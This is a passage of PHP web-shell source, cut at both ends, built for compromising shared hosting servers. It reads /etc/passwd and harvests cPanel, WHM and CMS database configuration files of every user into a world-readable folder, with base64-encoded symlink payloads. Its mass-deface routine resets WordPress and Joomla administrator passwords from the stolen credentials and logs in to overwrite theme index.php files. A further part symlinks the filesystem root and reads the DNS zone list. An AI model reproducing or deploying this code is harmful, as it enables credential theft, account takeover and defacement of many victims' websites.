XR0aW5ncy5waHAnLCRzaXRlc3MuJy1zbWYudHh0Jyk7IApzeW1saW5rKCcvdmFyL3d3dy92aG9zdHMvJy4kc2l0ZXNzLicvaHR0cGRvY3Mvc21mL1NldHRpbmdzLnBocCcsJHNpdGVzcy4nLXNtZjIudHh0Jyk7IApzeW1saW5rKCcvdmFyL3d3dy92aG9zdHMvJy4kc2l0ZXNzLicvaHR0cGRvY3MvZm9ydW0vU2V0dGluZ3MucGhwJywkc2l0ZXNzLictc21mLWZvcnVtLnR4dCcpOyAKc3ltbGluaygnL3Zhci93d3cvdmhvc3RzLycuJHNpdGVzcy4nL2h0dHBkb2NzL2ZvcnVtcy9TZXR0aW5ncy5waHAnLCRzaXRlc3MuJy1zbWYtZm9ydW1zLnR4dCcpOyAKc3ltbGluaygnL3Zhci93d3cvdmhvc3RzLycuJHNpdGVzcy4nL2h0dHBkb2NzL3VwbG9hZC9pbmNsdWRlcy9jb25maWcucGhwJywkc2l0ZXNzLictdXAudHh0Jyk7CnN5bWxpbmsoJy92YXIvd3d3L3Zob3N0cy8nLiRzaXRlc3MuJy9odHRwZG9jcy9hcnRpY2xlL2NvbmZpZy5waHAnLCRzaXRlc3MuJy1Od2FoeS50eHQnKTsgCnN5bWxpbmsoJy92YXIvd3d3L3Zob3N0cy8nLiRzaXRlc3MuJy9odHRwZG9jcy91cC9pbmNsdWRlcy9jb25maWcucGhwJywkc2l0ZXNzLictdXAyLnR4dCcpOwpzeW1saW5rKCcvdmFyL3d3dy92aG9zdHMvJy4kc2l0ZXNzLicvaHR0cGRvY3MvY29uZl9nbG9iYWwucGhwJywkc2l0ZXNzLictNi50eHQnKTsKc3ltbGluaygnL3Zhci93d3cvdmhvc3RzLycuJHNpdGVzcy4nL2h0dHBkb2NzL2luY2x1ZGUvZGIucGhwJywkc2l0ZXNzLictNy50eHQnKTsKc3ltbGluaygnL3Zhci93d3cvdmhvc3RzLycuJHNpdGVzcy4nL2h0dHBkb2NzL2Nvbm5lY3QucGhwJywkc2l0ZXNzLictUEhQLUZ1c2lvbi50eHQnKTsKc3ltbGluaygnL3Zhci93d3cvdmhvc3RzLycuJHNpdGVzcy4nL2h0dHBkb2NzL21rX2NvbmYucGhwJywkc2l0ZXNzLictOS50eHQnKTsKc3ltbGluaygnL3Zhci93d3cvdmhvc3RzLycuJHNpdGVzcy4nL2h0dHBkb2NzL2luY2x1ZGVzL2NvbmZpZy5waHAnLCRzaXRlc3MuJy10cmFpZG50MS50eHQnKTsKc3ltbGluaygnL3Zhci93d3cvdmhvc3RzLycuJHNpdGVzcy4nL2h0dHBkb2NzL2NvbmZpZy5waHAnLCRzaXRlc3MuJy00aW1hZ2VzLnR4dCcpOwpzeW1saW5rKCcvdmFyL3d3dy92aG9zdHMvJy4kc2l0ZXNzLicvaHR0cGRvY3Mvc2l0ZXMvZGVmYXVsdC9zZXR0aW5ncy5waHAnLCRzaXRlc3MuJy1EcnVwYWwudHh0Jyk7CnN5bWxpbmsoJy92YXIvd3d3L3Zob3N0cy8nLiRzaXRlc3MuJy9odHRwZG9jcy9tZW1iZXIvY29uZmlndXJhdGlvbi5waHAnLCRzaXRlc3MuJy0xbWVtYmVyLnR4dCcpIDsgCnN5bWxpbmsoJy92YXIvd3d3L3Zob3N0cy8nLiRzaXRlc3MuJy9odHRwZG9jcy9iaWxsaW5ncy9jb25maWd1cmF0aW9uLnBocCcsJHNpdGVzcy4nLWJpbGxpbmdzLnR4dCcpIDsgCnN5bWxpbmsoJy92YXIvd3d3L3Zob3N0cy8nLiRzaXRlc3MuJy9odHRwZG9jcy93aG0vY29uZmlndXJhdGlvbi5waHAnLCRzaXRlc3MuJy13aG0udHh0Jyk7CnN5bWxpbmsoJy92YXIvd3d3L3Zob3N0cy8nLiRzaXRlc3MuJy9odHRwZG9jcy9zdXBwb3J0cy9jb25maWd1cmF0aW9uLnBocCcsJHNpdGVzcy4nLXN1cHBvcnRzLnR4dCcpOwpzeW1saW5rKCcvdmFyL3d3dy92aG9zdHMvJy4kc2l0ZXNzLicvaHR0cGRvY3MvcmVxdWlyZXMvY29uZmlnLnBocCcsJHNpdGVzcy4nLUFNNFNTLWhvc3RpbmcudHh0Jyk7CnN5bWxpbmsoJy92YXIvd3d3L3Zob3N0cy8nLiRzaXRlc3MuJy9odHRwZG9jcy9zdXBwb3J0cy9pbmNsdWRlcy9pc280MjE3LnBocCcsJHNpdGVzcy4nLWhvc3RiaWxscy1zdXBwb3J0cy50eHQnKTsKc3ltbGluaygnL3Zhci93d3cvdmhvc3RzLycuJHNpdGVzcy4nL2h0dHBkb2NzL2NsaWVudC9pbmNsdWRlcy9pc280MjE3LnBocCcsJHNpdGVzcy4nLWhvc3RiaWxscy1jbGllbnQudHh0Jyk7CnN5bWxpbmsoJy92YXIvd3d3L3Zob3N0cy8nLiRzaXRlc3MuJy9odHRwZG9jcy9zdXBwb3J0L2luY2x1ZGVzL2lzbzQyMTcucGhwJywkc2l0ZXNzLictaG9zdGJpbGxzLXN1cHBvcnQudHh0Jyk7CnN5bWxpbmsoJy92YXIvd3d3L3Zob3N0cy8nLiRzaXRlc3MuJy9odHRwZG9jcy9iaWxsaW5nL2luY2x1ZGVzL2lzbzQyMTcucGhwJywkc2l0ZXNzLictaG9zdGJpbGxzLWJpbGxpbmcudHh0Jyk7CnN5bWxpbmsoJy92YXIvd3d3L3Zob3N0cy8nLiRzaXRlc3MuJy9odHRwZG9jcy9iaWxsaW5ncy9pbmNsdWRlcy9pc280MjE3LnBocCcsJHNpdGVzcy4nLWhvc3RiaWxscy1iaWxsaW5ncy50eHQnKTsKc3ltbGluaygnL3Zhci93d3cvdmhvc3RzLycuJHNpdGVzcy4nL2h0dHBkb2NzL2hvc3QvaW5jbHVkZXMvaXNvNDIxNy5waHAnLCRzaXRlc3MuJy1ob3N0YmlsbHMtaG9zdC50eHQnKTsKc3ltbGluaygnL3Zhci93d3cvdmhvc3RzLycuJHNpdGVzcy4nL2h0dHBkb2NzL2hvc3RzL2luY2x1ZGVzL2lzbzQyMTcucGhwJywkc2l0ZXNzLictaG9zdGJpbGxzLWhvc3RzLnR4dCcpOwpzeW1saW5rKCcvdmFyL3d3dy92aG9zdHMvJy4kc2l0ZXNzLicvaHR0cGRvY3MvaG9zdGluZy9pbmNsdWRlcy9pc280MjE3LnBocCcsJHNpdGVzcy4nLWhvc3RiaWxscy1ob3N0aW5nLnR4dCcpOwpzeW1saW5rKCcvdmFyL3d3dy92aG9zdHMvJy4kc2l0ZXNzLicvaHR0cGRvY3MvaG9zdGluZ3MvaW5jbHVkZXMvaXNvNDIxNy5waHAnLCRzaXRlc3MuJy1ob3N0YmlsbHMtaG9zdGluZ3MudHh0Jyk7CnN5bWxpbmsoJy92YXIvd3d3L3Zob3N0cy8nLiRzaXRlc3MuJy9odHRwZG9jcy9pbmNsdWRlcy9pc280MjE3LnBocCcsJHNpdGVzcy4nLWhvc3RiaWxscy50eHQnKTsKc3ltbGluaygnL3Zhci93d3cvdmhvc3RzLycuJHNpdGVzcy4nL2h0dHBkb2NzL2hvc3RiaWxscy9pbmNsdWRlcy9pc280MjE3LnBocCcsJHNpdGVzcy4nLWhvc3RiaWxscy1ob3N0YmlsbHMudHh0Jyk7CnN5bWxpbmsoJy92YXIvd3d3L3Zob3N0cy8nLiRzaXRlc3MuJy9odHRwZG9jcy9ob3N0YmlsbC9pbmNsdWRlcy9pc280MjE3LnBocCcsJHNpdGVzcy4nLWhvc3RiaWxscy1ob3N0YmlsbC50eHQnKTsKc3ltbGluaygnL3Zhci93d3cvdmhvc3RzLycuJHNpdGVzcy4nL2h0dHBkb2NzL2xva29tZWRpYS9jb25maWcva29uZWtzaS5waHAnLCRzaXRlc3MsJy1sb2tvbWVkaWEudHh0Jyk7CnN5bWxpbmsoJy92YXIvd3d3L3Zob3N0cy8nLiRzaXRlc3MuJy9odHRwZG9jcy9jb25maWcva29uZWtzaS5waHAnLCRzaXRlc3MsJy1sb2tvbWVkaWEudHh0Jyk7CnN5bWxpbmsoJy92YXIvd3d3L3Zob3N0cy8nLiRzaXRlc3MuJy9odHRwZG9jcy9wby1jb250ZW50L2NvbmZpZy5waHAnLCRzaXRlc3MsJy1wb3BvamkudHh0Jyk7CnN5bWxpbmsoJy92YXIvd3d3L3Zob3N0cy8nLiRzaXRlc3MuJy9odHRwZG9jcy92ZG9fY29uZmlnLnBocCcsJHNpdGVzcywnLVZvb2Rvby50eHQnKTsKc3ltbGluaygnL3Zhci93d3cvdmhvc3RzLycuJHNpdGVzcy4nL2h0dHBkb2NzL2J3X2NvbmZpZy9jb25maWcuaW5pJywkc2l0ZXNzLCctYm9zd2ViLnR4dCcpOwpzeW1saW5rKCcvdmFyL3d3dy92aG9zdHMvJy4kc2l0ZXNzLicvaHR0cGRvY3MvYndfY29uZmlnL2NvbmZpZy5pbmknLCRzaXRlc3MsJy1ib3N3ZWIudHh0Jyk7CnN5bWxpbmsoJy92YXIvd3d3L3Zob3N0cy8nLiRzaXRlc3MuJy9odHRwZG9jcy9hcHAvZXRjL2xvY2FsLnhtbCcsJHNpdGVzcywnLW1hZ2VudG8udHh0Jyk7CnN5bWxpbmsoJy92YXIvd3d3L3Zob3N0cy8nLiRzaXRlc3MuJy9odHRwZG9jcy9hcHAvZXRjL2xvY2FsLnhtbCcsJHNpdGVzcywnLW1hZ2VudG8udHh0Jyk7CnN5bWxpbmsoJy92YXIvd3d3L3Zob3N0cy8nLiRzaXRlc3MuJy9odHRwZG9jcy9kYi9rb25la3NpLnBocCcsJHNpdGVzcywnLXVua25vd24udHh0Jyk7CnN5bWxpbmsoJy92YXIvd3d3L3Zob3N0cy8nLiRzaXRlc3MuJy9odHRwZG9jcy9kYXRhYi9rb25la3NpLnBocCcsJHNpdGVzcywnLXVua25vd24udHh0Jyk7CnN5bWxpbmsoJy92YXIvd3d3L3Zob3N0cy8nLiRzaXRlc3MuJy9odHRwZG9jcy9rb2ZpZ3VyYXNpL2tvbmVrc2kucGhwJywkc2l0ZXNzLCctdW5rbm93bi50eHQnKTsKc3ltbGluaygnL3Zhci93d3cvdmhvc3RzLycuJHNpdGVzcy4nL2h0dHBkb2NzL2NvbmYvY29uZi5waHAnLCRzaXRlc3MsJy11bmtub3duLnR4dCcpOwpzeW1saW5rKCcvdmFyL3d3dy92aG9zdHMvJy4kc2l0ZXNzLicvaHR0cGRvY3Mvc2V0ZGF0YWJhc2UucGhwJywkc2l0ZXNzLCctdW5rbm93bi50eHQnKTsKc3ltbGluaygnL3Zhci93d3cvdmhvc3RzLycuJHNpdGVzcy4nL2h0dHBkb2NzL2RiL3NldGRhdGFiYXNlLnBocCcsJHNpdGVzcywnLXVua25vd24udHh0Jyk7Cn0KcHJpbnQgIjxicj48YnI+PGJyPjxhIGhyZWY9J2VjYm9zcy8nIHN0eWxlPSdjb2xvcjojMDBGRkZGJz5Eb25lIHwgQ2xpY2sgSGVyZSAhPC9mb250PiI7Cg==';
$file = fopen("ecini.ler" ,"w+");
$write = fwrite ($file ,base64_decode($config));
fclose($file);
    chmod("ecini.ler",0755);
   echo "<center><a href='ecboss/ecini.ler'>Click Here !</a></center>";
} elseif($_GET['do'] == 'config') {
    $etc = fopen("/etc/passwd", "r") or die("<pre><font color=red>Can't read /etc/passwd</font></pre>");
    $idx = mkdir("3xp", 0777);
    $isi_htc = "Options all\nRequire None\nSatisfy Any";
    $htc = fopen("3xp/.htaccess","w");
    fwrite($htc, $isi_htc);
    while($passwd = fgets($etc)) {
        if($passwd == "" || !$etc) {
            echo "<font color=red>Can't read /etc/passwd</font>";
        } else {
            preg_match_all('/(.*?):x:/', $passwd, $user_config);
            foreach($user_config[1] as $user_idx) {
                $user_config_dir = "/home/$user_idx/public_html/";
                if(is_readable($user_config_dir)) {
                    $grab_config = array(
                        "/home/$user_idx/.my.cnf" => "cpanel",
                        "/home/$user_idx/.accesshash" => "WHM-accesshash",
                        "/home/$user_idx/public_html/po-content/config.php" => "Popoji",
                        "/home/$user_idx/public_html/vdo_config.php" => "Voodoo",
                        "/home/$user_idx/public_html/bw-configs/config.ini" => "BosWeb",
                        "/home/$user_idx/public_html/config/koneksi.php" => "Lokomedia",
                        "/home/$user_idx/public_html/lokomedia/config/koneksi.php" => "Lokomedia",
                        "/home/$user_idx/public_html/clientarea/configuration.php" => "WHMCS",
                        "/home/$user_idx/public_html/whm/configuration.php" => "WHMCS",
                        "/home/$user_idx/public_html/whmcs/configuration.php" => "WHMCS",
                        "/home/$user_idx/public_html/forum/config.php" => "phpBB",
                        "/home/$user_idx/public_html/sites/default/settings.php" => "Drupal",
                        "/home/$user_idx/public_html/config/settings.inc.php" => "PrestaShop",
                        "/home/$user_idx/public_html/app/etc/local.xml" => "Magento",
                        "/home/$user_idx/public_html/joomla/configuration.php" => "Joomla",
                        "/home/$user_idx/public_html/configuration.php" => "Joomla",
                        "/home/$user_idx/public_html/administrator/config.php" => "Joomla",
                        "/home/$user_idx/public_html/wp/wp-config.php" => "WordPress",
                        "/home/$user_idx/public_html/wordpress/wp-config.php" => "WordPress",
                        "/home/$user_idx/public_html/wp-config.php" => "WordPress",
                        "/home/$user_idx/public_html/admin/config.php" => "OpenCart",
                        "/home/$user_idx/public_html/slconfig.php" => "Sitelok",
                        "/home/$user_idx/public_html/application/config/database.php" => "Ellislab",
                        "/home/$user_idx/public_html/db/db.php" => "Unknown",
                        "/home/$user_idx/public_html/setdatabaseb.php" => "Unknown",
                        "/home/$user_idx/public_html/db/setdatabaseb.php" => "Unknown",
                        "/home/$user_idx/public_html/database/db.php" => "Unknown",
                        "/home/$user_idx/public_html/koneksi/db.php" => "Unknown",
                        "/home/$user_idx/public_html/koneksi/database.php" => "Unknown",
                        "/home/$user_idx/public_html/koneksi/koneksi.php" => "Unknown",
                        "/home/$user_idx/public_html/db/config.php" => "Unknown",
                        "/home/$user_idx/public_html/db/database.php" => "Unknown",
                        "/home/$user_idx/public_html/database/config.php" => "Unknown",
                        "/home/$user_idx/public_html/konfigurasi/conf.php" => "Unknown",
                        "/home/$user_idx/public_html/konfigurasi/database.php" => "Unknown",
                        "/home/$user_idx/public_html/conf/db.php" => "Unknown",
                        "/home/$user_idx/public_html/conf/php.php" => "Unknown",
                        "/home/$user_idx/public_html/conf/config.php" => "Unknown",
                        "/home/$user_idx/public_html/conf/conf.php" => "Unknown",
                        "/home/$user_idx/public_html/admin/koneksi.php" => "Unknown",
                        "/home/$user_idx/public_html/cf/db.php" => "Unknown",
                        "/home/$user_idx/public_html/config/index.php" => "Unknown",
                        "/home/$user_idx/public_html/config/data.php" => "Unknown",
                        "/home/$user_idx/public_html/admin/db.php" => "Unknown",
                        "/home/$user_idx/public_html/admin/config.php" => "Unknown",
                        "/home/$user_idx/public_html/admin/configuration.php" => "Unknown",
                        "/home/$user_idx/public_html/admin/conf.php" => "Unknown",
                        "/home/$user_idx/public_html/configuracion/connection.php" => "Unknown",
                        "/home/$user_idx/public_html/connection" => "Unknown",
                        "/home/$user_idx/public_html/konfigurasi/config.php" => "Unknown");
                    foreach($grab_config as $config => $nama_config) {
                        $ambil_config = file_get_contents($config);
                        if($ambil_config == '') {
                        } else {
                            $file_config = fopen("3xp/$user_idx-$nama_config.txt","w");
                            fputs($file_config,$ambil_config);
                        }
                    }
                }      
            }
        }  
    }
    echo "<center><a href='?bom&folder=$dir/3xp'><font color=lime>Done</font></a></center>";
} elseif($_GET['do'] == 'boom') {
    {error_reporting(0);function entre2v2($text,$marqueurDebutLien,$marqueurFinLien,$i=1){$ar0=explode($marqueurDebutLien, $text);$ar1=explode($marqueurFinLien, $ar0[$i]);return trim($ar1[0]);}function randomt() {$chars = "abcdefghijkmnopqrstuvwxyz023456789";srand((double)microtime()*1000000);$i = 0;$pass = '';while ($i <= 7) {$num = rand() % 33;$tmp = substr($chars, $num, 1);$pass = $pass . $tmp;$i++;}return $pass;}function index_changer_wp($conf, $content) {$output = '';$dol = '$';$go = 0;$username = entre2v2($conf,"define('DB_USER', '","');");$password = entre2v2($conf,"define('DB_PASSWORD', '","');");$dbname = entre2v2($conf,"define('DB_NAME', '","');");$prefix = entre2v2($conf,$dol."table_prefix  = '","'");$host = entre2v2($conf,"define('DB_HOST', '","');");$link=mysql_connect($host,$username,$password);if($link) {mysql_select_db($dbname,$link) ;$dol = '$';$req1 = mysql_query("UPDATE `".$prefix."users` SET `user_login` = 'admin',`user_pass` = '4297f44b13955235245b2497399d7a93' WHERE `ID` = 1");} else {$output.= "[-] DB Error<br />";}if($req1) {$req = mysql_query("SELECT * from  `".$prefix."options` WHERE option_name='home'");$data = mysql_fetch_array($req);$site_url=$data["option_value"]; $req = mysql_query("SELECT * from  `".$prefix."options` WHERE option_name='template'");$data = mysql_fetch_array($req);$template = $data["option_value"];$req = mysql_query("SELECT * from  `".$prefix."options` WHERE option_name='current_theme'");$data = mysql_fetch_array($req);$current_theme = $data["option_value"];$useragent="Mozilla/4.0 (compatible; MSIE 7.0b; Windows NT 5.1; .NET CLR 1.1.4322; Alexa Toolbar; .NET CLR 2.0.50727)";$url2=$site_url."/wp-login.php";$ch = curl_init();curl_setopt($ch, CURLOPT_URL, $url2);curl_setopt($ch, CURLOPT_POST, 1);curl_setopt($ch, CURLOPT_POSTFIELDS,"log=admin&pwd=123123&rememberme=forever&wp-submit=Log In&testcookie=1");curl_setopt($ch, CURLOPT_FOLLOWLOCATION, 1);curl_setopt($ch, CURLOPT_RETURNTRANSFER,1);curl_setopt($ch, CURLOPT_HEADER, 0);curl_setopt($ch, CURLOPT_CONNECTTIMEOUT, 10);curl_setopt($ch, CURLOPT_USERAGENT, $useragent);curl_setopt($ch, CURLOPT_COOKIEJAR, "COOKIE.txt");curl_setopt($ch, CURLOPT_COOKIEFILE, "COOKIE.txt");$buffer = curl_exec($ch);$pos = strpos($buffer,"action=logout");if($pos === false) {$output.= "[-] Login Error<br />";} else {$output.= "[+] Login Successful<br />";$go = 1;}if($go) {$cond = 0;$url2=$site_url."/wp-admin/theme-editor.php?file=/themes/".$template.'/index.php&theme='.urlencode($current_theme).'&dir=theme';curl_setopt($ch, CURLOPT_URL, $url2);curl_setopt($ch, CURLOPT_FOLLOWLOCATION, 0);curl_setopt($ch, CURLOPT_RETURNTRANSFER,1);curl_setopt($ch, CURLOPT_HEADER, 0);curl_setopt($ch, CURLOPT_USERAGENT, $useragent);curl_setopt($ch, CURLOPT_COOKIEJAR, "COOKIE.txt");curl_setopt($ch, CURLOPT_COOKIEFILE, "COOKIE.txt");$buffer0 = curl_exec($ch);$_wpnonce = entre2v2($buffer0,'<input type="hidden" id="_wpnonce" name="_wpnonce" value="','" />');$_file = entre2v2($buffer0,'<input type="hidden" name="file" value="','" />');if(substr_count($_file,"/index.php") != 0){$output.= "[+] index.php loaded in Theme Editor<br />";$url2=$site_url."/wp-admin/theme-editor.php";curl_setopt($ch, CURLOPT_URL, $url2);curl_setopt($ch, CURLOPT_POST, 1);curl_setopt($ch, CURLOPT_POSTFIELDS,"newcontent=".base64_decode($content)."&action=update&file=".$_file."&_wpnonce=".$_wpnonce."&submit=Update File");curl_setopt($ch, CURLOPT_FOLLOWLOCATION, 1);curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);curl_setopt($ch, CURLOPT_HEADER, 0);curl_setopt($ch, CURLOPT_USERAGENT, $useragent);curl_setopt($ch, CURLOPT_COOKIEJAR, "COOKIE.txt");curl_setopt($ch, CURLOPT_COOKIEFILE, "COOKIE.txt");$buffer = curl_exec($ch);curl_close($ch);$pos = strpos($buffer,'<div id="message" class="updated">');if($pos === false) {$output.= "[-] Updating Index.php Error<br />";} else {$output.= "[+] Index.php Updated Successfuly<br />";$hk = explode('public_html',$_file);$output.= '[+] Deface '.file_get_contents($site_url.str_replace('/blog','',$hk[1]));$cond = 1;}} else {$url2=$site_url.'/wp-admin/theme-editor.php?file=index.php&theme='.$template;curl_setopt($ch, CURLOPT_URL, $url2);curl_setopt($ch, CURLOPT_FOLLOWLOCATION, 0);curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);curl_setopt($ch, CURLOPT_HEADER, 0);curl_setopt($ch, CURLOPT_USERAGENT, $useragent);curl_setopt($ch, CURLOPT_COOKIEJAR, "COOKIE.txt");curl_setopt($ch, CURLOPT_COOKIEFILE, "COOKIE.txt");$buffer0 = curl_exec($ch);$_wpnonce = entre2v2($buffer0,'<input type="hidden" id="_wpnonce" name="_wpnonce" value="','" />');$_file = entre2v2($buffer0,'<input type="hidden" name="file" value="','" />');if(substr_count($_file,"index.php") != 0){$output.= "[+] index.php loaded in Theme Editor<br />";$url2=$site_url."/wp-admin/theme-editor.php";curl_setopt($ch, CURLOPT_URL, $url2);curl_setopt($ch, CURLOPT_POST, 1);curl_setopt($ch, CURLOPT_POSTFIELDS,"newcontent=".base64_decode($content)."&action=update&file=".$_file."&theme=".$template."&_wpnonce=".$_wpnonce."&submit=Update File");curl_setopt($ch, CURLOPT_FOLLOWLOCATION, 1);curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);curl_setopt($ch, CURLOPT_HEADER, 0);curl_setopt($ch, CURLOPT_USERAGENT, $useragent);curl_setopt($ch, CURLOPT_COOKIEJAR, "COOKIE.txt");curl_setopt($ch, CURLOPT_COOKIEFILE, "COOKIE.txt");$buffer = curl_exec($ch);curl_close($ch);$pos = strpos($buffer,'<div id="message" class="updated">');if($pos === false) {$output.= "[-] Updating Index.php Error<br />";} else {$output.= "[+] Index.php Template Updated Successfuly<br />";$output.= '[+] Deface '.file_get_contents($site_url.'/wp-content/themes/'.$template.'/index.php');$cond = 1;}} else {$output.= "[-] index.php can not load in Theme Editor<br />";}}}} else {$output.= "[-] DB Error<br />";}global $base_path;unlink($base_path.'COOKIE.txt');return array('cond'=>$cond, 'output'=>$output);}function index_changer_joomla($conf, $content, $domain) {$doler = '$';$username = entre2v2($conf, $doler."user = '", "';");$password = entre2v2($conf, $doler."password = '", "';");$dbname = entre2v2($conf, $doler."db = '", "';");$prefix = entre2v2($conf, $doler."dbprefix = '", "';");$host = entre2v2($conf, $doler."host = '","';");$co=randomt();$site_url = "http://".$domain."/administrator";$output = '';$cond = 0; $link=mysql_connect($host, $username, $password);if($link) {mysql_select_db($dbname,$link) ;$req1 = mysql_query("UPDATE `".$prefix."users` SET `username` ='admin' , `password` = '4297f44b13955235245b2497399d7a93', `usertype` = 'Super Administrator', `block` = 0");$req = mysql_numrows(mysql_query("SHOW TABLES LIKE '".$prefix."extensions'"));} else {$output.= "[-] DB Error<br />";}if($req1){if ($req) {$req = mysql_query("SELECT * from  `".$prefix."template_styles` WHERE `client_id` = '0' and `home` = '1'");$data = mysql_fetch_array($req);$template_name = $data["template"];$req = mysql_query("SELECT * from  `".$prefix."extensions` WHERE `name`='".$template_name."' or `element` = '".$template_name."'");$data = mysql_fetch_array($req);$template_id = $data["extension_id"];$url2=$site_url."/index.php";$ch = curl_init();curl_setopt($ch, CURLOPT_URL, $url2);curl_setopt($ch, CURLOPT_FOLLOWLOCATION, 1);curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);curl_setopt($ch, CURLOPT_HEADER, 0);curl_setopt($ch, CURLOPT_USERAGENT, $useragent);curl_setopt($ch, CURLOPT_COOKIEJAR, $co); curl_setopt($ch, CURLOPT_COOKIEFILE, $co); $buffer = curl_exec($ch);$return = entre2v2($buffer ,'<input type="hidden" name="return" value="','"');$hidden = entre2v2($buffer ,'<input type="hidden" name="','" value="1"',4);if($return && $hidden) {curl_setopt($ch, CURLOPT_URL, $url2);curl_setopt($ch, CURLOPT_POST, 1);curl_setopt($ch, CURLOPT_REFERER, $url2);curl_setopt($ch, CURLOPT_POSTFIELDS, "username=admin&passwd=123123&option=com_login&task=login&return=".$return."&".$hidden."=1");curl_setopt($ch, CURLOPT_FOLLOWLOCATION, 1);curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);curl_setopt($ch, CURLOPT_HEADER, 0);curl_setopt($ch, CURLOPT_USERAGENT, $useragent);curl_setopt($ch, CURLOPT_COOKIEJAR, $co); curl_setopt($ch, CURLOPT_COOKIEFILE, $co); $buffer = curl_exec($ch);$pos = strpos($buffer,"com_config");if($pos === false) {$output.= "[-] Login Error<br />";} else {$output.= "[+] Login Successful<br />";}}if($pos){$url2=$site_url."/index.php?option=com_templates&task=source.edit&id=".base64_encode($template_id.":index.php");$ch = curl_init();curl_setopt($ch, CURLOPT_URL, $url2);curl_setopt($ch, CURLOPT_FOLLOWLOCATION, 1);curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);curl_setopt($ch, CURLOPT_HEADER, 0);curl_setopt($ch, CURLOPT_USERAGENT, $useragent);curl_setopt($ch, CURLOPT_COOKIEJAR, $co); curl_setopt($ch, CURLOPT_COOKIEFILE, $co); $buffer = curl_exec($ch);$hidden2=entre2v2($buffer ,'<input type="hidden" name="','" value="1"',2);if($hidden2) {$output.= "[+] index.php file found in Theme Editor<br />";} else {$output.= "[-] index.php Not found in Theme Editor<br />";}}if($hidden2) {$url2=$site_url."/index.php?option=com_templates&layout=edit";$ch = curl_init();curl_setopt($ch, CURLOPT_URL, $url2);curl_setopt($ch, CURLOPT_POST, 1);curl_setopt($ch, CURLOPT_POSTFIELDS,"jform[source]=".$content."&jform[filename]=index.php&jform[extension_id]=".$template_id."&".$hidden2."=1&task=source.save");curl_setopt($ch, CURLOPT_FOLLOWLOCATION, 1);curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);curl_setopt($ch, CURLOPT_HEADER, 0);curl_setopt($ch, CURLOPT_USERAGENT, $useragent);curl_setopt($ch, CURLOPT_COOKIEJAR, $co); curl_setopt($ch, CURLOPT_COOKIEFILE, $co); $buffer = curl_exec($ch);curl_close($ch);$pos = strpos($buffer,'<dd class="message message">');$cond = 0;if($pos === false) {$output.= "[-] Updating Index.php Error<br />";} else {$output.= "[+] Index.php Template successfully saved<br />";$cond = 1;}}} else {$req =mysql_query("SELECT * from  `".$prefix."templates_menu` WHERE client_id='0'");$data = mysql_fetch_array($req);$template_name=$data["template"];$useragent="Mozilla/4.0 (compatible; MSIE 7.0b; Windows NT 5.1; .NET CLR 1.1.4322; Alexa Toolbar; .NET CLR 2.0.50727)";$url2=$site_url."/index.php";$ch = curl_init();curl_setopt($ch, CURLOPT_URL, $url2);curl_setopt($ch, CURLOPT_FOLLOWLOCATION, 1);curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);curl_setopt($ch, CURLOPT_HEADER, 0);curl_setopt($ch, CURLOPT_CONNECTTIMEOUT, 10);curl_setopt($ch, CURLOPT_USERAGENT, $useragent);curl_setopt($ch, CURLOPT_COOKIEJAR, $co); curl_setopt($ch, CURLOPT_COOKIEFILE, $co); $buffer = curl_exec($ch);$hidden=entre2v2($buffer ,'<input type="hidden" name="','" value="1"',3);if($hidden) {curl_setopt($ch, CURLOPT_URL, $url2);curl_setopt($ch, CURLOPT_POST, 1);curl_setopt($ch, CURLOPT_POSTFIELDS,"username=admin&passwd=123456&option=com_login&task=login&".$hidden."=1");curl_setopt($ch, CURLOPT_FOLLOWLOCATION, 1);curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);curl_setopt($ch, CURLOPT_HEADER, 0);curl_setopt($ch, CURLOPT_USERAGENT, $useragent);curl_setopt($ch, CURLOPT_COOKIEJAR, $co); curl_setopt($ch, CURLOPT_COOKIEFILE, $co); $buffer = curl_exec($ch);$pos = strpos($buffer,"com_config");if($pos === false) {$output.= "[-] Login Error<br />";} else {$output.= "[+] Login Successful<br />";}}if($pos) {$url2=$site_url."/index.php?option=com_templates&task=edit_source&client=0&id=".$template_name;curl_setopt($ch, CURLOPT_URL, $url2);curl_setopt($ch, CURLOPT_FOLLOWLOCATION, 1);curl_setopt($ch,CURLOPT_RETURNTRANSFER,1);curl_setopt($ch, CURLOPT_HEADER, 0);curl_setopt($ch, CURLOPT_USERAGENT, $useragent);curl_setopt($ch, CURLOPT_COOKIEJAR, $co); curl_setopt($ch, CURLOPT_COOKIEFILE, $co); $buffer = curl_exec($ch);$hidden2=entre2v2($buffer ,'<input type="hidden" name="','" value="1"',6);if($hidden2) {$output.= "[+] index.php file founded in Theme Editor<br />";} else {$output.= "[-] index.php Not found in Theme Editor<br />";}}if($hidden2) {$url2=$site_url."/index.php?option=com_templates&layout=edit";curl_setopt($ch, CURLOPT_URL, $url2);curl_setopt($ch, CURLOPT_POST, 1);curl_setopt($ch, CURLOPT_POSTFIELDS,"filecontent=".$content."&id=".$template_name."&cid[]=".$template_name."&".$hidden2."=1&task=save_source&client=0");curl_setopt($ch, CURLOPT_FOLLOWLOCATION, 1);curl_setopt($ch,CURLOPT_RETURNTRANSFER,1);curl_setopt($ch, CURLOPT_HEADER, 0);curl_setopt($ch, CURLOPT_USERAGENT, $useragent);curl_setopt($ch, CURLOPT_COOKIEJAR, $co); curl_setopt($ch, CURLOPT_COOKIEFILE, $co);$buffer = curl_exec($ch);curl_close($ch);$pos = strpos($buffer,'<dd class="message message fade">');$cond = 0;if($pos === false) {$output.= "[-] Updating Index.php Error<br />";} else {$output.= "[+] Index.php Template successfully saved<br />";$cond = 1;}}}} else {$output.= "[-] DB Error<br />";}global $base_path;unlink($base_path.$co);return array('cond'=>$cond, 'output'=>$output); }function exec_mode_1($def_url) {@mkdir('sym',0777);$wr  = "Options all \n DirectoryIndex Sux.html \n AddType text/plain .php \n AddHandler server-parsed .php \n  AddType text/plain .html \n AddHandler txt .html \n Require None \n Satisfy Any";$fp = @fopen ('sym/.htaccess','w');fwrite($fp, $wr);@symlink('/','sym/root');$dominios = @file_get_contents("/etc/named.conf");@preg_match_all('/.*?zone "(.*?)" {/', $dominios, $out);$out[1] = array_unique($out[1]);$numero_dominios = 